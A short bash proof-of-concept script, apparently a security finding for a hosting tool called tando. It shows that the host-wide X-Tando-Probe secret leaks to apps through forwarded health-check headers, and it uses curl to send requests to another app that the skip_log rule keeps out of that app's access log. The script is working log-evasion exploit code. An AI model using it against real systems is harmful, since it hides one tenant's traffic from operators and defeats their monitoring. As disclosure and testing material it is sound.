#!/bin/bash
# probe-secret-leak.sh: run INSIDE any tando app (as its user). Caddy forwards the client's request
# headers to the app, including tando's own X-Tando-Probe, so every app receives the host-wide
# probe secret with each health check (deploy verify, tando-watch every minute). With it, the app
# sends requests to ANOTHER app through Caddy (127.0.0.1:80) that are left out of that app's request
# log (the skip_log rule is: secret header + remote 127.0.0.1/::1). Usage: probe-secret-leak.sh <victim-host> <secret>
# The secret is captured by any app that logs the X-Tando-Probe header of its health requests.
V=$1 S=$2
for i in 1 2 3; do curl -s -o /dev/null -w '%{http_code} ' -H "Host: $V" -H "X-Tando-Probe: $S" -A x "http://127.0.0.1:80/unlogged-$i"; done
curl -s -o /dev/null -w '%{http_code} control\n' -H "Host: $V" "http://127.0.0.1:80/control-logged"
# then, as root: grep -c unlogged /var/log/tando/<victim>/access.log   -> 0 (control: 1)
